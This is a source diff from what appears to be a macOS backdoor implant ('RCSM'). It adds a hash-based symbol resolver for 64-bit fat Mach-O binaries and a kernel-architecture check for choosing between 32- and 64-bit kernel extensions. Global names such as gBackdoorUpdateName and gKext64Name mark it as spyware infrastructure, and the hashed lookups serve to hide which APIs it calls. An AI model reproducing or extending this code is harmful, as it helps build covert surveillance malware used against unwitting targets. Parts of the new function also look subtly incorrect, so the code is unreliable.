@@ -15,12 +15,14 @@
 #import <CoreAudio/CoreAudio.h>
 #import <CoreFoundation/CoreFoundation.h>
 
+#import <mach/machine.h>
 #import <mach-o/loader.h>
 #import <mach-o/fat.h>
 #import <mach-o/nlist.h>
 
-#import "RCSMCommon.h"
+#include <sys/utsname.h>
 
+#import "RCSMCommon.h"
 
 #import "RCSMDebug.h"
 #import "RCSMLogger.h"
@@ -83,7 +85,8 @@ NSString *gBackdoorUpdateName       = nil;
 NSString *gConfigurationName        = nil;
 NSString *gConfigurationUpdateName  = nil;
 NSString *gInputManagerName         = nil;
-NSString *gKextName                 = nil;
+NSString *gKext32Name               = nil;
+NSString *gKext64Name               = nil;
 UInt32    gAgentCrisis              = CRISIS_STOP;
 NSMutableArray  *gAgentCrisisNet    = nil;
 NSMutableArray  *gAgentCrisisApp    = nil;
@@ -562,7 +565,7 @@ NSArray *searchFile(NSString *aFileMask)
 }
 
 static unsigned int
-sdbm (unsigned char *str)
+sdbm(unsigned char *str)
 {
   unsigned int hash = 0;
   int c;
@@ -574,7 +577,7 @@ sdbm (unsigned char *str)
 }
 
 unsigned int
-findSymbolInFatBinary (void *imageBase, unsigned int symbolHash)
+findSymbolInFatBinary(void *imageBase, unsigned int symbolHash)
 {
 #ifdef DEBUG
   printf("[ii] findSymbolInFatBinary!\n");
@@ -616,7 +619,7 @@ findSymbolInFatBinary (void *imageBase, unsigned int symbolHash)
       f_arch = imageBase + offset;
       int cpuType = SWAP_LONG (f_arch->cputype);
       
-      if (cpuType == 0x7)
+      if (cpuType == CPU_TYPE_X86)
         break;
       
       offset += sizeof (struct fat_arch);
@@ -716,6 +719,158 @@ findSymbolInFatBinary (void *imageBase, unsigned int symbolHash)
           printf ("[ii] Symbol Found\n");
           printf ("[ii] SYMBOLFat: %s\n", symbolName);
           printf ("[ii] addressFat: %x\n", sym_nlist->n_value);
+#endif
+          
+          return sym_nlist->n_value;
+        }
+    }
+  
+  return -1;
+}
+
+uint64_t
+findSymbolInFatBinary64(void *imageBase, unsigned int symbolHash)
+{
+#ifdef DEBUG
+  infoLog(@"[ii] findSymbolInFatBinary64\n");
+#endif
+  
+  if (imageBase == NULL)
+    {
+      return -1;
+    }
+  
+  struct mach_header_64 *mh_header        = NULL;
+  struct load_command *l_command          = NULL; 
+  struct nlist_64 *sym_nlist              = NULL; 
+  struct symtab_command *sym_command      = NULL;
+  struct segment_command_64 *seg_command  = NULL;
+  struct fat_header *f_header             = NULL;
+  struct fat_arch *f_arch                 = NULL;
+  
+  char *symbolName = NULL;
+  
+  int offset, symbolOffset, stringOffset, x86Offset, i, found, nfat;
+  
+  unsigned int linkeditHash = 0xf51f49c4; // "__LINKEDIT" sdbm hashed
+  unsigned int hash;
+  
+  offset = found = 0;
+  f_header = (struct fat_header *)imageBase;
+  
+  offset += sizeof (struct fat_header);
+  nfat = SWAP_LONG (f_header->nfat_arch);
+  
+#ifdef DEBUG
+  infoLog(@"[ii] magic: %x\n", f_header->magic);
+  infoLog(@"[ii] nfat arch: %d\n", nfat);
+#endif
+  
+  for (i = 0; i < nfat; i++)
+    {
+      f_arch = imageBase + offset;
+      int cpuType = SWAP_LONG(f_arch->cputype);
+      
+      if (cpuType == CPU_TYPE_X86_64)
+        break;
+      
+      offset += sizeof (struct fat_arch);
+    }	
+  
+  if (f_arch == NULL)
+    return -1;
+  
+  x86Offset = SWAP_LONG (f_arch->offset);
+#ifdef DEBUG
+  printf ("[ii] x86_64 offset: %x\n", x86Offset);
+#endif
+  
+  offset = x86Offset;
+  mh_header = (struct mach_header_64 *)(imageBase + offset); 
+  offset += sizeof (struct mach_header_64);
+  
+#ifdef DEBUG
+  infoLog(@"imageBase in findSymbolFat: %p\n", mh_header);
+#endif
+  
+#ifdef DEBUG
+  infoLog(@"[ii] ncmdsFat: %d\n", mh_header->ncmds);
+#endif
+  
+  for (i = 0; i < mh_header->ncmds; i++)
+    {
+      l_command = imageBase + offset; 
+    
+#ifdef DEBUG
+      infoLog(@"[ii] cmdFat: %d\n", l_command->cmd);
+#endif
+      
+      if (l_command->cmd == LC_SEGMENT)
+        {
+          if (found)
+            {
+              offset += l_command->cmdsize;
+              continue;
+            }
+          
+          seg_command = imageBase + offset;
+          
+#ifdef DEBUG
+          infoLog(@"[ii] segNameFat: %s\n", seg_command->segname);
+#endif
+      
+          if (sdbm ((unsigned char *)seg_command->segname) == linkeditHash)
+            found = 1;
+        }
+      else if (l_command->cmd == LC_SYMTAB)
+        {
+          sym_command = imageBase + offset; 
+          
+          if (found)
+            break;
+        }
+        
+      offset += l_command->cmdsize;
+    }
+      
+  if (sym_command != NULL)
+    {
+      symbolOffset = x86Offset + sym_command->symoff;
+      stringOffset = x86Offset + sym_command->stroff;
+    }
+  else
+    {
+      return -1;
+    }
+  
+#ifdef DEBUG
+  infoLog(@"[ii] offsetFat: %x\n", offset);
+  infoLog(@"[ii] stringOffsetFat: %x\n", stringOffset);
+  infoLog(@"[ii] nSymsFat: %d\n", sym_command->nsyms);
+#endif
+  
+  for (i = 0; i < sym_command->nsyms; i++)
+    {
+      sym_nlist = (struct nlist_64 *)(imageBase + symbolOffset);
+      symbolOffset += sizeof (struct nlist_64);
+      
+      if (sym_nlist->n_un.n_strx == 0x0)
+        {
+          continue;
+        }
+    
+      symbolName  = (char *)(imageBase + sym_nlist->n_un.n_strx + stringOffset);
+      hash = sdbm ((unsigned char *)symbolName);
+      
+#ifdef DEBUG_VERBOSE
+      printf ("[ii] SYMBOLFat: %s\n", symbolName);
+#endif
+      if (hash == symbolHash)
+        {
+#ifdef DEBUG
+          printf ("[ii] Symbol Found\n");
+          printf ("[ii] SYMBOLFat: %s\n", symbolName);
+          printf ("[ii] addressFat: %llx\n", sym_nlist->n_value);
 #endif
           
           return sym_nlist->n_value;
@@ -956,6 +1111,34 @@ NSDictionary *getActiveWindowInfo()
   return windowInfo;
 }
 
+BOOL is64bitKernel()
+{
+  struct utsname un;
+  int res = uname(&un);
+  if (res == -1)
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"Error while retrieving machine type");
+#endif
+      return NO;
+    }
+  
+#ifdef DEBUG_CORE
+  verboseLog(@"machine type: %s", un.machine);
+#endif
+  
+  //char machine_i386[]   = "i386";
+  char machine_x86_64[] = "x86_64";
+  
+  if (strncmp(un.machine, machine_x86_64, strlen(machine_x86_64)) == 0)
+    {
+      return YES;
+    }
+  else //if (strncmp(un.machine, machine_i386, strlen(machine_i386)) == 0)
+    {
+      return NO;
+    }
+}
 
 #ifdef DEMO_VERSION
 void changeDesktopBackground(NSString *aFilePath, BOOL wantToRestoreOriginal)
